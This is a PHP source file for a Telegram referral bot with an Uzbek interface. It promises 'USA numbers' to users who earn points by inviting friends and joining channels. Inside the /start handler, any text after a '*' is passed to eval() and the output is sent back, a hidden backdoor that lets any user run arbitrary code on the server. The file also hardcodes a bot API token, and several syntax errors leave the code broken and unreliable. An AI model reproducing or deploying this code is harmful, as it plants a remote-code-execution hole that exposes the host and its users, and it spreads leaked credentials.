<?php
ob_start();
define('API_KEY','5098898283:AAHxeqUlgPv6cecw4tVPo6KgndA002xdLmY';)
$admin = "5027499938"; //admin id
$bot = "UsaRaqamProBot"; //bot ismi
$kanalimz = "@BestCodersGroup"; //kanal useri
/// @PHP_New kanaliga obuna bo'ling///
   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
   }

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}


  
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$filee = "coin/$cid.step";
$folder = "coin";
$folder2 = "azo";


if (!file_exists($folder.'/test.fd3')) {
  mkdir($folder);
  file_put_contents($folder.'/test.fd3', 'by @Vep_Master');
}

if (!file_exists($folder2.'/test.fd3')) {
  mkdir($folder2);
  file_put_contents($folder2.'/test.fd3', 'by @Vep_Master');
}

if (file_exists($filee)) {
  $step = file_get_contents($filee);
}

$name = $message->from->firstname;
$tx = $message->text;

$kun1 = date('z', strtotime('5 hour'));

$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"📢Kanal Orqali📢"],],
[['text'=>"🔗Referal Orqali🔗"],],
[['text'=>"📈Statistika📊"],['text'=>"👨🏻‍💻Admin Bilan Bogʻlanish👨🏻‍�?"],],
]
]);

$key2 = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"Referal Kodingiz"],['text'=>"Ballar"],],
[['text'=>"🔙Orqaga Qaytish"],],
]
]);

$key3 = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 Orqaga Qaytish"],],
]
]);
/// @PHP_New kanaliga obuna bo'ling///
$balinfo = "Usa Nomer Olish Uchun Nima Qilish Kerak?
Referal orqali botga 15 ball toʻplasangiz 2 ta usa nomer olishingiz mumkin.
Kanal Orqali botka 5 ta Doʻstingizni chaqirib 2 ball olishingiz mumkin.
siz kuniga 2 ta usa nomer olishingiz mumkin.
👨🏻‍💻Creator: @BestCodersAdmin
📢Channel: @BestCodersGroup";

if((mb_stripos($tx,"/start")!==false) or ($tx == "Ortga")) {
  ty($cid);

  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
    $bgun = file_get_contents("bugun.$kun1");
    $bgun += 1;
    file_put_contents("bugun.$kun1",$bgun);
  }

  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,"$cid") !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"G'irromlik mumkin emas",
      ]);
    } else {

      $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);

      $usr = file_get_contents("coin/$refid.dat");
$usr = $usr + 1;
      file_put_contents("coin/$refid.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
'text'=>"Tabriklaymiz sizni do'stingiz referal silkangizga start berdi va siz 1 ball ga ega bo'ldingiz!!",
      ]);
    }
  }

  file_put_contents("coin/$cid.dat", "0");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$cid,
  'text'=>$balinfo,
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
  ]);
}

if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

    if($tx == "🔗Referal Orqali🔗"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$balinfo,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

    if($tx == "Ballar"){
      ty($cid);
      $ball = file_get_contents("coin/$cid.dat");
      $in = "Sizning hisobingizda $ball bal mavjud!
minimal:15 bal";
      if($ball>=15) $in .= "\nUsa Nomer olish uchun sizda yetarlicha bal mavjud.yechib olasizmi?
Eslatib oʻtamiz:Sizdan 15 bal olinadi va sizga 2 ta usa nomer beriladi.";
      if($ball>=15) $key2 = json_encode([
      'resize_keyboard'=>true,
      'keyboard'=>[
      [['text'=>"Ha"],['text'=>"Yoʻq"],],
      [['text'=>"🔙Orqaga Qaytish"],],
      ]
      ]);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$in,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

    if($tx == "Ha"){
      ty($cid);
      $ball = file_get_contents("coin/$cid.dat");

      if($ball > 15){
        bot('sendMessage',[
        'chat_id'=>$cid,
'text'=>"1 kun ichida sizga usa nomerlar yetib boradi!",
        'reply_to_message_id'=>$mid,
        'reply_markup'=>$key3,
        ]);
        file_put_contents("coin/$cid.step","nomer");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"@BestCodersAdmin! ga yozing
⛔Spam boʻlsangiz: @BestCodersGroup ga yozing!",
        'reply_to_message_id'=>$mid,
        ]);
        $ball -=10;
        file_put_contents("coin/$cid.dat","$ball");
      }
    }
/// @PHP_New kanaliga obuna bo'ling///
    else if($step == "nomer"){
      ty($cid);

      if($tx == "🔙Orqaga Qaytish"){
        del("coin/$cid.step");
      }else{
        $ball = file_get_contents("coin/$cid.dat");
        $bali = file_get_contents("coin/$cid.dat");
        if($ball <= 15) $bali *= 15;
        else if($ball <= 15) $bali *= 15;
        else if($ball <= 15) $bali *= 15;
        else if($ball <= 15) $bali *= 15;
        else if($ball <= 15) $bali *= 15;
        bot('sendMessage',[
        'chat_id'=>$admin,
        'text'=>$tx."\n\n Bizning botimizdan foydalanganingiz uchun raxmat!",
        ]);
        bot('sendMessage',[
        'chat_id'=>$cid,
'text'=>"Ishlaringizga Omad!",
        'reply_markup'=>$key,
        ]);
        file_put_contents("coin/$cid.dat","0");
        del("coin/$cid.step");
      }
    }

    if($tx == "Yoʻq"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Qancha ball koʻp boʻlsa, Usa Nomerlar ham shuncha koʻp boʻladi.Omad!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "🔙Orqaga Qaytish"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$balinfo,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "Referal Kodingiz"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Sizning Referal kodingiz:\n https://telegram.me/$bot?start=$cid",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

    if($tx == "📈Statistika📊"){
      ty($cid);
      $eski = $kun1-1;
      del("bugun.$eski");
      $new = file_get_contents("bugun.$kun1");
      $baza = file_get_contents("coin.dat");
      $obsh = substr_count($baza,"\n");
      bot('sendMessage',[
      'chat_id'=>$cid,
'text'=>"📈Statistika📊 \n\n 👥Botimiz a'zolari: $obsh
➖➖➖➖➖➖➖➖➖➖➖➖�?
💸Toʻlangan Usalar: 26 ta
♻️Yangilargan Sana: 13.07.2021 yil.",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "👨🏻‍💻Admin Bilan Bogʻlanish👨🏻‍�?"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
'text'=>"Admin: @BestCodersAdmin
 🕗Ish Vaqti: 24 soat
Bot yaratishni istasangiz: @BestCodersAdmin
⛔Spamlar: @BestCodersGroup";
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    $replyik = $message->reply_to_message->text;
    $yubbi = "Yuboriladigan xabarni kiriting.Xabar turi markdown";
/// @PHP_New kanaliga obuna bo'ling///
    if($tx == "/send" and $cid == $admin){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$yubbi,
      'reply_markup'=>$key3,
      ]);
      file_put_contents("coin/$cid.step","send");
    }

    if($step == "send" and $cid == $admin){
      ty($cid);
      if($tx == "🔙Orqaga Qaytish"){
      del("coin/$cid.step");
      }else{
      ty($cid);
      $idss=file_get_contents("coin.dat");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      ]);
      }
      del("coin/$cid.step");
      }
    }

if(stripos($tx,"/push")!==false){
      $ex=explode("_",$tx);
      $refid = $ex[1];
      $usr = file_get_contents("coin/$refid.dat");
$usr -= $ex[2];
      file_put_contents("coin/$refid.dat", "$usr");
    }

    $nocha = "Hech kim kanal qoʻshmagan!
Kanal qoʻshing!";
    $noazo = "Siz kanalga a'zo boʻlmagansiz!";
$okcha = "Siz kanalga a'zo boʻldingiz va 2 ballga ega boʻldingiz!
5 kun ichida kanaldan chiqib ketsangiz sizning 2 balingiz olib qoʻyiladi.";

    if((stripos($tx,"/Kanal")!==false) and $cid == $admin){
      $ex=explode("=",$tx);
      file_put_contents("kanal.dat", "$ex[1]|$ex[2]|0");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"📢Kanal: ".$ex[2]."\n👥Kerakli odam soni: ".$ex[1]."\nBoshqa kanal qoʻshmay turing.Bot kanal qoʻshish mumkin deydi. Agar qoʻshsangiz bot xisobidan adashib ketadi.",
      'reply_markup'=>$key,
      ]);
    }

    if((stripos($tx,"/otmen")!==false) and $cid == $admin){
      unlink("kanal.dat");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Kanal o'chirildi!",
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "📢Kanal Orqali📢"){
      ty($cid);
      $get = file_get_contents("kanal.dat");
      if($get){
        list($odam,$kanal,$now) = explode("|",$get);
        if($odam == $now){
        unlink("kanal.dat");
        bot('sendMessage',[
        'chat_id'=>$admin,
        'text'=>"Kanal qoʻshishingiz mumkin.",
        'reply_markup'=>$key,
        ]);
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
        }else{
        file_put_contents("coin/$cid.step","chek");
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"$kanal - kanaliga qoʻshiling va tekshirish tugmasi bosing!",
        'reply_markup'=>json_encode([
        'resize_keyboard'=>true,
        'keyboard'=>[
        [['text'=>"Tekshirish"],],
        ]
        ]),
        ]);
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
      }
    }

    if($tx == "Tekshirish"){
      del("coin/$cid.step");
      $get = file_get_contents("kanal.dat");
      if($get){

        list($odam,$kanal,$now) = explode("|",$get);
        $tekshir = file_get_contents("azo/$cid.$kanal");

        if($tekshir){
          bot('sendMessage',[
          'chat_id'=>$cid,
          'text'=>"Siz avval bu kanalda bor edingiz!",
          'reply_markup'=>$key,
          ]);
        }else{
          $get = file_get_contents("kanal.dat");
          list($odam,$kanal,$now) = explode("|",$get);
          $gett = bot('getChatMember',[
          'chat_id' => $kanal,
          'user_id' => $cid,
          ]);
          $gget = $gett->result->status;

          if($gget == "member"){
$now += 5;
            file_put_contents("kanal.dat", "$odam|$kanal|$now");
            $kabin = file_get_contents("coin/$cid.dat");
$kabi = $kabin + 5;
            file_put_contents("coin/$cid.dat", "$kabi");
            $time = date('d', strtotime('5 hour'));
            file_put_contents("azo/$cid.$kanal", "$kanal|$cid|$time");
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>$okcha,
            'reply_markup'=>$key,
            ]);
          }else{
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>$noazo,
            'reply_markup'=>$key,
            ]);
          }
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
      }
    }

    if(isset($tx)){
      $baza = file_get_contents("coin.dat");

      if(mb_stripos($baza, $cid) !== false){ 
      }else{
        $baza = file_get_contents("coin.dat");
        $dat = "$baza\n$cid";
        file_put_contents("coin.dat", $dat);
      }
      $faylla = glob("azo/*.*");

      foreach($faylla as $fayl){
        $geti = file_get_contents("$fayl");
        list($chati,$usri,$ftime) = explode("|",$geti);
        $nowtime = date('d', strtotime('-72 hour'));
        if($ftime < $nowtime){
        unlink("$fayl");
        }else{
        $gett = bot('getChatMember',[
        'chat_id' => $chati,
        'user_id' => $usri,
        ]);
        $gget = $gett->result->status;
        if($gget != "member"){
        bot('sendMessage',[
        'chat_id'=>$usri,
        'text'=>"Siz $chati kanalidan 5 kun boʻlmasidan chiqib ketdingiz.Sizdan 2 ball ayirilmoqda... ",
        'reply_markup'=>$key,
        ]);
        /// @PHP_New kanaliga obuna bo'ling///
                $kabin = file_get_contents("coin/$usri.dat");
        $ball = $kabin - 2;
        file_put_contents("coin/$usri.dat", "$ball");
        unlink("$fayl");
        }
        }
      }
    }
  } else{
    bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Siz hozirda $kanalimz kanaliga a'zo boʻmagansiz. Iltimos kanalimizga a'zo boʻling va botni ishlatishingiz mumkin \n agarda kanalga a'zo boʻlmagan xolatda botga a'zo qoʻshsangiz  bot u a'zo uchun sizga bal berilmaydi.",
    ]);
  }
}
?>